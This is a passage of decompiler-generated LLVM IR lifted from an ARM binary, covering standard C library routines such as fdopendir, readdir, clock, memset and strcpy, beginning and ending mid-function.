  %v0_12768 = phi i32 [ %v2_1273c, %dec_label_pc_12724 ], [ 0, %dec_label_pc_1271c ], [ %v0_12768.pre, %dec_label_pc_12748 ]
  store i32 %v3_126c0, i32* @r7, align 4
  ret i32 %v0_12768

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_12768, { 2, 0, 1 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12778:
  %v0_12778 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12778, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12778
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12778, %bb
  %v7_12780 = phi i32 [ %arg1, %dec_label_pc_12778 ], [ 0, %bb ]
  ret i32 %v7_12780

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_12788 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_12788, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12794 = call i32 @fstat()
  store i32 %v0_12794, i32* @r5, align 4
  %v2_12798 = icmp eq i32 %v0_12794, 0
  br i1 %v2_12798, label %dec_label_pc_127a0, label %dec_label_pc_12818

dec_label_pc_127a0:                               ; preds = %entry
  %v1_127a4 = and i32 %tmp4, 61440
  store i32 %v1_127a4, i32* @r3, align 4
  %v7_127a8 = icmp eq i32 %v1_127a4, 16384
  br i1 %v7_127a8, label %dec_label_pc_127c8, label %dec_label_pc_127b0

dec_label_pc_127b0:                               ; preds = %dec_label_pc_127a0
  %v0_127b4 = call i32 @__aeabi_read_tp()
  %v3_127b8 = load i16, i16* @global_var_23068.362, align 2
  %v0_127bc = load i32, i32* @r5, align 4
  store i32 %v0_127bc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_127fc

dec_label_pc_127c8:                               ; preds = %dec_label_pc_127a0
  %v0_127c8 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_127d0 = call i32 @__libc_fcntl(i32 %v0_127c8, i32 3)
  %v7_127d4 = icmp eq i32 %v2_127d0, -1
  br i1 %v7_127d4, label %dec_label_pc_12818, label %dec_label_pc_127dc

dec_label_pc_127dc:                               ; preds = %dec_label_pc_127c8
  %v1_127dc = urem i32 %v2_127d0, 4
  store i32 %v1_127dc, i32* %r3.global-to-local, align 4
  %v7_127e0 = icmp eq i32 %v1_127dc, 1
  br i1 %v7_127e0, label %dec_label_pc_127e8, label %dec_label_pc_12804

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127dc
  %v0_127ec = call i32 @__aeabi_read_tp()
  %v3_127f0 = load i16, i16* @global_var_23068.362, align 2
  %v0_127f4 = load i32, i32* @r5, align 4
  store i32 %v0_127f4, i32* %r1.global-to-local, align 4
  %v0_127f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_127f8 = add i32 %v0_127f8, 21
  br label %dec_label_pc_127fc

dec_label_pc_127fc:                               ; preds = %dec_label_pc_127b0, %dec_label_pc_127e8
  %v2_127fc.in = phi i16 [ %v3_127b8, %dec_label_pc_127b0 ], [ %v3_127f0, %dec_label_pc_127e8 ]
  %v1_127fc = phi i32 [ %v0_127b4, %dec_label_pc_127b0 ], [ %v0_127ec, %dec_label_pc_127e8 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_127b0 ], [ %v1_127f8, %dec_label_pc_127e8 ]
  %v2_127fc = sext i16 %v2_127fc.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_127fc = add i32 %v1_127fc, %v2_127fc
  %v4_127fc = inttoptr i32 %v3_127fc to i32*
  store i32 %storemerge, i32* %v4_127fc, align 4
  %v0_1281c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1281c

dec_label_pc_12804:                               ; preds = %dec_label_pc_127dc
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12808 = load i32, i32* @r4, align 4
  %v2_1280c = call i32 @fd_to_DIR(i32 %v0_12808, i32 %tmp)
  store i32 %v2_1280c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1281c

dec_label_pc_12818:                               ; preds = %entry, %dec_label_pc_127c8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1281c

dec_label_pc_1281c:                               ; preds = %dec_label_pc_12804, %dec_label_pc_127fc, %dec_label_pc_12818
  %v0_1281c = phi i32 [ %v2_1280c, %dec_label_pc_12804 ], [ %v0_1281c.pre, %dec_label_pc_127fc ], [ 0, %dec_label_pc_12818 ]
  ret i32 %v0_1281c

; uselistorder directives
  uselistorder i32 %v1_127dc, { 1, 0 }
  uselistorder i32 %v2_127d0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 5, 8, 4, 9, 1, 10, 2, 11, 3, 12 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_1281c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12818, { 1, 0 }
  uselistorder label %dec_label_pc_127fc, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_12834 = load i32, i32* @r4, align 4
  %v6_12834 = load i32, i32* @r5, align 4
  %v9_12834 = load i32, i32* @r6, align 4
  %v12_12834 = load i32, i32* @r7, align 4
  %v15_12834 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r6, align 4
  %v1_12848 = add i32 %tmp, 24
  store i32 %v1_12848, i32* @r4, align 4
  %v4_1284c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 68) to i32*), align 4
  store i32 %v4_1284c, i32* %r1.global-to-local, align 4
  store i32 %v1_12848, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_12860 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12860)
  %v0_12874 = load i32, i32* @r6, align 4
  %v2_12874 = add i32 %v0_12874, 16
  %v3_12874 = inttoptr i32 %v2_12874 to i32*
  %v4_12874 = load i32, i32* %v3_12874, align 4
  store i32 %v4_12874, i32* @ip, align 4
  store i32 75904, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12874)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %dec_label_pc_128b4, %entry
  %v0_12884 = load i32, i32* @r5, align 4
  %v1_12884 = add i32 %v0_12884, 4
  %v2_12884 = inttoptr i32 %v1_12884 to i32*
  %v3_12884 = load i32, i32* %v2_12884, align 4
  store i32 %v3_12884, i32* %r2.global-to-local, align 4
  %v4_12884 = add i32 %v0_12884, 8
  %v5_12884 = inttoptr i32 %v4_12884 to i32*
  %v6_12884 = load i32, i32* %v5_12884, align 4
  %tmp10 = icmp ugt i32 %v6_12884, %v3_12884
  br i1 %tmp10, label %dec_label_pc_128b4, label %dec_label_pc_12890

dec_label_pc_12890:                               ; preds = %dec_label_pc_12884
  %v1_12890 = inttoptr i32 %v0_12884 to i32*
  %v2_12890 = load i32, i32* %v1_12890, align 4
  %v1_12894 = add i32 %v0_12884, 12
  %v2_12894 = inttoptr i32 %v1_12894 to i32*
  %v3_12894 = load i32, i32* %v2_12894, align 4
  store i32 %v3_12894, i32* %r1.global-to-local, align 4
  %v1_12898 = add i32 %v0_12884, 20
  %v2_12898 = inttoptr i32 %v1_12898 to i32*
  %v3_12898 = load i32, i32* %v2_12898, align 4
  store i32 %v3_12898, i32* %r2.global-to-local, align 4
  %v4_1289c = call i32 @__getdents(i32 %v2_12890, i32 %v3_12894, i32 %v3_12898, i32 %v6_12884)
  %tmp9 = icmp slt i32 %v4_1289c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_128ac

.thread:                                          ; preds = %dec_label_pc_12890
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_128e0

dec_label_pc_128ac:                               ; preds = %dec_label_pc_12890
  %v1_128ac = load i32, i32* @r5, align 4
  %v2_128ac = add i32 %v1_128ac, 8
  %v3_128ac = inttoptr i32 %v2_128ac to i32*
  store i32 %v4_1289c, i32* %v3_128ac, align 4
  %v0_128b0 = load i32, i32* @r7, align 4
  %v1_128b0 = load i32, i32* @r5, align 4
  %v2_128b0 = add i32 %v1_128b0, 4
  %v3_128b0 = inttoptr i32 %v2_128b0 to i32*
  store i32 %v0_128b0, i32* %v3_128b0, align 4
  %v0_128b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_128b4

dec_label_pc_128b4:                               ; preds = %dec_label_pc_12884, %dec_label_pc_128ac
  %v1_128c4 = phi i32 [ %v0_12884, %dec_label_pc_12884 ], [ %v0_128b4.pre, %dec_label_pc_128ac ]
  %v1_128b4 = add i32 %v1_128c4, 4
  %v2_128b4 = inttoptr i32 %v1_128b4 to i32*
  %v3_128b4 = load i32, i32* %v2_128b4, align 4
  store i32 %v3_128b4, i32* %r2.global-to-local, align 4
  %v1_128b8 = add i32 %v1_128c4, 12
  %v2_128b8 = inttoptr i32 %v1_128b8 to i32*
  %v3_128b8 = load i32, i32* %v2_128b8, align 4
  store i32 %v3_128b8, i32* %r1.global-to-local, align 4
  %v2_128bc = add i32 %v3_128b8, %v3_128b4
  store i32 %v2_128bc, i32* @r4, align 4
  %v1_128c0 = add i32 %v2_128bc, 4
  %v2_128c0 = inttoptr i32 %v1_128c0 to i32*
  %v3_128c0 = load i32, i32* %v2_128c0, align 4
  %v2_128c4 = add i32 %v1_128c4, 16
  %v3_128c4 = inttoptr i32 %v2_128c4 to i32*
  store i32 %v3_128c0, i32* %v3_128c4, align 4
  %v0_128c8 = load i32, i32* @r4, align 4
  %v1_128c8 = add i32 %v0_128c8, 8
  %v2_128c8 = inttoptr i32 %v1_128c8 to i16*
  %v3_128c8 = load i16, i16* %v2_128c8, align 2
  %v4_128c8 = zext i16 %v3_128c8 to i32
  %v0_128cc = load i32, i32* %r2.global-to-local, align 4
  %v1_128cc = load i32, i32* %r1.global-to-local, align 4
  %v2_128cc = add i32 %v1_128cc, %v0_128cc
  %v3_128cc = inttoptr i32 %v2_128cc to i32*
  %v4_128cc = load i32, i32* %v3_128cc, align 4
  store i32 %v4_128cc, i32* %r1.global-to-local, align 4
  %v2_128d0 = add i32 %v0_128cc, %v4_128c8
  %v2_128d4 = icmp eq i32 %v4_128cc, 0
  %v1_128d8 = load i32, i32* @r5, align 4
  %v2_128d8 = add i32 %v1_128d8, 4
  %v3_128d8 = inttoptr i32 %v2_128d8 to i32*
  store i32 %v2_128d0, i32* %v3_128d8, align 4
  br i1 %v2_128d4, label %dec_label_pc_12884, label %dec_label_pc_128e0

dec_label_pc_128e0:                               ; preds = %dec_label_pc_128b4, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_128ec = load i32, i32* @r6, align 4
  %v2_128ec = add i32 %v0_128ec, 44
  %v3_128ec = inttoptr i32 %v2_128ec to i32*
  %v4_128ec = load i32, i32* %v3_128ec, align 4
  call void @__pseudo_branch(i32 %v4_128ec)
  %v0_128f8 = load i32, i32* @r4, align 4
  store i32 %v3_12834, i32* @r4, align 4
  store i32 %v6_12834, i32* @r5, align 4
  store i32 %v9_12834, i32* @r6, align 4
  store i32 %v12_12834, i32* @r7, align 4
  store i32 %v15_12834, i32* @lr, align 4
  ret i32 %v0_128f8

; uselistorder directives
  uselistorder i32 %v1_128c4, { 0, 2, 1 }
  uselistorder i32 %v6_12884, { 1, 0 }
  uselistorder i32 %v0_12884, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_128b4, { 1, 0 }
}

define i32 @function_1290c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1290c:
  %v0_1290c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1290c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1290c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1290c, %bb
  %v4_12918 = phi i32 [ %arg1, %dec_label_pc_1290c ], [ 0, %bb ]
  ret i32 %v4_12918

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_1291c = load i32, i32* @lr, align 4
  %v0_12924 = call i32 @__aeabi_read_tp()
  %v3_12928 = load i16, i16* @global_var_23068.362, align 2
  %v4_12928 = sext i16 %v3_12928 to i32
  %v2_1292c = add i32 %v4_12928, %v0_12924
  store i32 %v0_1291c, i32* @lr, align 4
  ret i32 %v2_1292c
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_12940 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_12940, i32* @r0, align 4
  %v1_12948 = call i32 @times(i32 %v2_12940)
  %v2_1294c = load i32, i32* %stack_var_-24, align 4
  %v2_12950 = add i32 %v2_1294c, %tmp
  %v2_12958 = mul i32 %v2_12950, 10000
  %v1_1295c = and i32 %v2_12958, 2147483632
  ret i32 %v1_1295c

; uselistorder directives
  uselistorder i32 %v2_12940, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_12970 = call i32 @_memcpy()
  ret i32 %v0_12970
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_12980 = call i32 @_memcpy()
  ret i32 %v0_12980

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_12994 = icmp eq i32 %arg3, 8
  store i1 %v8_12994, i1* %cpsr_z.global-to-local, align 1
  %v5_12998 = icmp slt i32 %arg3, 8
  br i1 %v5_12998, label %dec_label_pc_129f8, label %dec_label_pc_1299c

dec_label_pc_1299c:                               ; preds = %entry
  %v4_1299c = mul i32 %arg2, 256
  %v5_1299c = or i32 %v4_1299c, %arg2
  %v4_129a0 = mul i32 %v5_1299c, 65536
  %v5_129a0 = or i32 %v4_129a0, %v5_1299c
  store i32 %v5_129a0, i32* @r1, align 4
  %v1_129a457 = urem i32 %tmp, 4
  %v2_129a458 = icmp eq i32 %v1_129a457, 0
  store i1 %v2_129a458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_129a458, label %dec_label_pc_129b4, label %bb

bb:                                               ; preds = %dec_label_pc_1299c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1299c ]
  %v3_129a859 = phi i32 [ %v6_129a8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1299c ]
  %v4_129a8 = inttoptr i32 %v3_129a859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_129a8, align 1
  %v5_129a8 = load i32, i32* @r3, align 4
  %v6_129a8 = add i32 %v5_129a8, 1
  store i32 %v6_129a8, i32* @r3, align 4
  %v0_129ac.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_129b8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_129ac.pr, label %dec_label_pc_129b4, label %.thread

.thread:                                          ; preds = %bb
  %v2_129ac = add i32 %v0_129b8.pr.pre, -1
  store i32 %v2_129ac, i32* %r2.global-to-local, align 4
  %v1_129a4 = urem i32 %v6_129a8, 4
  %v2_129a4 = icmp eq i32 %v1_129a4, 0
  store i1 %v2_129a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_129a4, label %dec_label_pc_129b4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_129a8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_129a8.pre to i8
  br label %bb

dec_label_pc_129b4:                               ; preds = %.thread, %bb, %dec_label_pc_1299c
  %v0_129c028 = phi i32 [ %tmp, %dec_label_pc_1299c ], [ %v6_129a8, %bb ], [ %v6_129a8, %.thread ]
  %v0_129b8.pr = phi i32 [ %arg3, %dec_label_pc_1299c ], [ %v0_129b8.pr.pre, %bb ], [ %v2_129ac, %.thread ]
  %v0_129b4 = load i32, i32* @r1, align 4
  store i32 %v0_129b4, i32* %ip.global-to-local, align 4
  %v8_129b810 = icmp eq i32 %v0_129b8.pr, 8
  store i1 %v8_129b810, i1* %cpsr_z.global-to-local, align 1
  %v5_129bc11 = icmp slt i32 %v0_129b8.pr, 8
  br i1 %v5_129bc11, label %dec_label_pc_129f8, label %dec_label_pc_129c0.preheader

dec_label_pc_129c0.preheader:                     ; preds = %dec_label_pc_129b4
  %v1_129c046 = inttoptr i32 %v0_129c028 to i32*
  store i32 %v0_129b4, i32* %v1_129c046, align 4
  %v3_129c047 = add i32 %v0_129c028, 4
  %v4_129c048 = inttoptr i32 %v3_129c047 to i32*
  %v5_129c049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_129c049, i32* %v4_129c048, align 4
  %v6_129c050 = add i32 %v0_129c028, 8
  store i32 %v6_129c050, i32* @r3, align 4
  %v0_129c451 = load i32, i32* %r2.global-to-local, align 4
  %v1_129c452 = add i32 %v0_129c451, -8
  store i32 %v1_129c452, i32* %r2.global-to-local, align 4
  %v5_129cc53 = icmp slt i32 %v1_129c452, 8
  br i1 %v5_129cc53, label %dec_label_pc_129c0.dec_label_pc_129f8.loopexit_crit_edge, label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %dec_label_pc_129c0.preheader, %dec_label_pc_129b8.dec_label_pc_129c0_crit_edge
  %v6_129c055 = phi i32 [ %v6_129c0, %dec_label_pc_129b8.dec_label_pc_129c0_crit_edge ], [ %v6_129c050, %dec_label_pc_129c0.preheader ]
  %v0_129c054 = phi i32 [ %v12_129ec, %dec_label_pc_129b8.dec_label_pc_129c0_crit_edge ], [ %v0_129c028, %dec_label_pc_129c0.preheader ]
  %v1_129d0 = inttoptr i32 %v6_129c055 to i32*
  %v2_129d0 = load i32, i32* @r1, align 4
  store i32 %v2_129d0, i32* %v1_129d0, align 4
  %v3_129d0 = add i32 %v0_129c054, 12
  %v4_129d0 = inttoptr i32 %v3_129d0 to i32*
  %v5_129d0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_129d0, i32* %v4_129d0, align 4
  %v6_129d0 = add i32 %v0_129c054, 16
  store i32 %v6_129d0, i32* @r3, align 4
  %v0_129d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_129d4 = add i32 %v0_129d4, -8
  store i32 %v1_129d4, i32* %r2.global-to-local, align 4
  %v5_129dc = icmp slt i32 %v1_129d4, 8
  br i1 %v5_129dc, label %dec_label_pc_129d0.dec_label_pc_129f8.loopexit_crit_edge, label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129d0
  %v1_129e0 = inttoptr i32 %v6_129d0 to i32*
  %v2_129e0 = load i32, i32* @r1, align 4
  store i32 %v2_129e0, i32* %v1_129e0, align 4
  %v3_129e0 = add i32 %v0_129c054, 20
  %v4_129e0 = inttoptr i32 %v3_129e0 to i32*
  %v5_129e0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_129e0, i32* %v4_129e0, align 4
  %v6_129e0 = add i32 %v0_129c054, 24
  store i32 %v6_129e0, i32* @r3, align 4
  %v0_129e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_129e4 = add i32 %v0_129e4, -8
  store i32 %v1_129e4, i32* %r2.global-to-local, align 4
  %v5_129ec = icmp slt i32 %v1_129e4, 8
  br i1 %v5_129ec, label %dec_label_pc_129e0.dec_label_pc_129f8.loopexit_crit_edge, label %dec_label_pc_129b8

dec_label_pc_129b8:                               ; preds = %dec_label_pc_129e0
  %v7_129ec = inttoptr i32 %v6_129e0 to i32*
  %v8_129ec = load i32, i32* @r1, align 4
  store i32 %v8_129ec, i32* %v7_129ec, align 4
  %v9_129ec = add i32 %v0_129c054, 28
  %v10_129ec = inttoptr i32 %v9_129ec to i32*
  %v11_129ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_129ec, i32* %v10_129ec, align 4
  %v12_129ec = add i32 %v0_129c054, 32
  store i32 %v12_129ec, i32* @r3, align 4
  %v6_129f0 = load i32, i32* %r2.global-to-local, align 4
  %v7_129f0 = add i32 %v6_129f0, -8
  store i32 %v7_129f0, i32* %r2.global-to-local, align 4
  %v5_129bc = icmp slt i32 %v7_129f0, 8
  br i1 %v5_129bc, label %dec_label_pc_129b8.dec_label_pc_129f8.loopexit_crit_edge, label %dec_label_pc_129b8.dec_label_pc_129c0_crit_edge

dec_label_pc_129b8.dec_label_pc_129c0_crit_edge:  ; preds = %dec_label_pc_129b8
  %v2_129c0.pre = load i32, i32* @r1, align 4
  %v1_129c0 = inttoptr i32 %v12_129ec to i32*
  store i32 %v2_129c0.pre, i32* %v1_129c0, align 4
  %v3_129c0 = add i32 %v0_129c054, 36
  %v4_129c0 = inttoptr i32 %v3_129c0 to i32*
  %v5_129c0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_129c0, i32* %v4_129c0, align 4
  %v6_129c0 = add i32 %v0_129c054, 40
  store i32 %v6_129c0, i32* @r3, align 4
  %v0_129c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_129c4 = add i32 %v0_129c4, -8
  store i32 %v1_129c4, i32* %r2.global-to-local, align 4
  %v5_129cc = icmp slt i32 %v1_129c4, 8
  br i1 %v5_129cc, label %dec_label_pc_129c0.dec_label_pc_129f8.loopexit_crit_edge, label %dec_label_pc_129d0

dec_label_pc_129b8.dec_label_pc_129f8.loopexit_crit_edge: ; preds = %dec_label_pc_129b8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_129f8

dec_label_pc_129c0.dec_label_pc_129f8.loopexit_crit_edge: ; preds = %dec_label_pc_129b8.dec_label_pc_129c0_crit_edge, %dec_label_pc_129c0.preheader
  %v1_129c4.lcssa = phi i32 [ %v1_129c452, %dec_label_pc_129c0.preheader ], [ %v1_129c4, %dec_label_pc_129b8.dec_label_pc_129c0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_129f8

dec_label_pc_129d0.dec_label_pc_129f8.loopexit_crit_edge: ; preds = %dec_label_pc_129d0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_129f8

dec_label_pc_129e0.dec_label_pc_129f8.loopexit_crit_edge: ; preds = %dec_label_pc_129e0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_129f8

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129b4, %dec_label_pc_129b8.dec_label_pc_129f8.loopexit_crit_edge, %dec_label_pc_129c0.dec_label_pc_129f8.loopexit_crit_edge, %dec_label_pc_129d0.dec_label_pc_129f8.loopexit_crit_edge, %dec_label_pc_129e0.dec_label_pc_129f8.loopexit_crit_edge, %entry
  %v0_12a00 = phi i32 [ %arg3, %entry ], [ %v1_129e4, %dec_label_pc_129e0.dec_label_pc_129f8.loopexit_crit_edge ], [ %v1_129d4, %dec_label_pc_129d0.dec_label_pc_129f8.loopexit_crit_edge ], [ %v1_129c4.lcssa, %dec_label_pc_129c0.dec_label_pc_129f8.loopexit_crit_edge ], [ %v7_129f0, %dec_label_pc_129b8.dec_label_pc_129f8.loopexit_crit_edge ], [ %v0_129b8.pr, %dec_label_pc_129b4 ]
  %v2_129f8 = icmp eq i32 %v0_12a00, 0
  store i1 %v2_129f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_129f8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_129f8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_129f8
  %v1_12a00 = sub i32 7, %v0_12a00
  store i32 %v1_12a00, i32* %r2.global-to-local, align 4
  %v3_12a04 = mul i32 %v1_12a00, 4
  %v4_12a04 = add i32 %v3_12a04, ptrtoint (i32* @global_var_12a0c.409 to i32)
  call void @__pseudo_branch(i32 %v4_12a04)
  %v0_12a0c = load i32, i32* @r1, align 4
  %v1_12a0c = trunc i32 %v0_12a0c to i8
  %v2_12a0c = load i32, i32* @r3, align 4
  %v3_12a0c = inttoptr i32 %v2_12a0c to i8*
  store i8 %v1_12a0c, i8* %v3_12a0c, align 1
  %v4_12a0c = load i32, i32* @r3, align 4
  %v5_12a0c = add i32 %v4_12a0c, 1
  store i32 %v5_12a0c, i32* %r3.global-to-local, align 4
  %v0_12a10 = load i32, i32* @r1, align 4
  %v1_12a10 = trunc i32 %v0_12a10 to i8
  %v3_12a10 = inttoptr i32 %v5_12a0c to i8*
  store i8 %v1_12a10, i8* %v3_12a10, align 1
  %v4_12a10 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a10 = add i32 %v4_12a10, 1
  store i32 %v5_12a10, i32* %r3.global-to-local, align 4
  %v0_12a14 = load i32, i32* @r1, align 4
  %v1_12a14 = trunc i32 %v0_12a14 to i8
  %v3_12a14 = inttoptr i32 %v5_12a10 to i8*
  store i8 %v1_12a14, i8* %v3_12a14, align 1
  %v4_12a14 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a14 = add i32 %v4_12a14, 1
  store i32 %v5_12a14, i32* %r3.global-to-local, align 4
  %v0_12a18 = load i32, i32* @r1, align 4
  %v1_12a18 = trunc i32 %v0_12a18 to i8
  %v3_12a18 = inttoptr i32 %v5_12a14 to i8*
  store i8 %v1_12a18, i8* %v3_12a18, align 1
  %v4_12a18 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a18 = add i32 %v4_12a18, 1
  store i32 %v5_12a18, i32* %r3.global-to-local, align 4
  %v0_12a1c = load i32, i32* @r1, align 4
  %v1_12a1c = trunc i32 %v0_12a1c to i8
  %v3_12a1c = inttoptr i32 %v5_12a18 to i8*
  store i8 %v1_12a1c, i8* %v3_12a1c, align 1
  %v4_12a1c = load i32, i32* %r3.global-to-local, align 4
  %v5_12a1c = add i32 %v4_12a1c, 1
  store i32 %v5_12a1c, i32* %r3.global-to-local, align 4
  %v0_12a20 = load i32, i32* @r1, align 4
  %v1_12a20 = trunc i32 %v0_12a20 to i8
  %v3_12a20 = inttoptr i32 %v5_12a1c to i8*
  store i8 %v1_12a20, i8* %v3_12a20, align 1
  %v4_12a20 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a20 = add i32 %v4_12a20, 1
  store i32 %v5_12a20, i32* %r3.global-to-local, align 4
  %v0_12a24 = load i32, i32* @r1, align 4
  %v1_12a24 = trunc i32 %v0_12a24 to i8
  %v3_12a24 = inttoptr i32 %v5_12a20 to i8*
  store i8 %v1_12a24, i8* %v3_12a24, align 1
  %v4_12a24 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a24 = add i32 %v4_12a24, 1
  store i32 %v5_12a24, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_129c0, { 1, 0 }
  uselistorder i32 %v12_129ec, { 1, 2, 0 }
  uselistorder i32 %v0_129c054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_129b8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_129a8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1299c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 1, 9, 8, 0, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_129f8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_129d0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_12a401 = load i32, i32* @r1, align 4
  %v1_12a402 = inttoptr i32 %v0_12a401 to i8*
